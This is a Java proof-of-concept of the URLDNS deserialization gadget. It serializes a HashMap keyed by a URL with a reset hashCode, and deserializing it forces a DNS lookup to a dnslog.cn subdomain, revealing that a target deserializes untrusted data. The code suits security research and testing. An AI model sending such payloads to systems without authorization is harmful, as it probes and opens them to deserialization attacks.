import java.io.*;
import java.lang.reflect.Field;
import java.net.URL;
import java.util.HashMap;

public class URLDNS {
    public static void main(String[] args) throws Exception{
        URL url = new URL("http://64hu68.dnslog.cn");
        HashMap ht = new HashMap();
        Field f = Class.forName("java.net.URL").getDeclaredField("hashCode");
        f.setAccessible(true);
        f.set(url, -1); //防止put就先进行解析DNS
        ht.put(url,"RRR");


        //序列化写文件
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("out.bin"));
        oos.writeObject(ht);
        //反序列化触发payload
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream("out.bin"));
        ois.readObject();

    }

}